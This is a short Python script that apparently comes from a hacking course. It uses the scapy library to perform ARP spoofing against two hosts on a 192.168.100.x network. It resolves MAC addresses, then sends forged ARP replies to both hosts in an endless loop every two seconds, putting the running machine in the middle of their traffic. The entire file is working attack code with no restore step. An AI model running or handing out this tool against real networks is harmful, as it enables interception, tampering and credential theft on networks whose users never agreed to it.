import scapy.all as scapy
import time
#copied from network_scanner.py
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]


    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#sent_packets_count = no. of packets sent
sent_packets_count = 0
while True:
    spoof("192.168.100.2", "192.168.100.1")
    spoof("192.168.100.1", "192.168.100.2")
    #increment_packets_count by 2 (a delay of 2 seconds)
    sent_packets_count = sent_packets_count + 2
    #pass sent_packets_count as str
    print("[+] Sent two packets" + str(sent_packets_count))
    time.sleep(2)
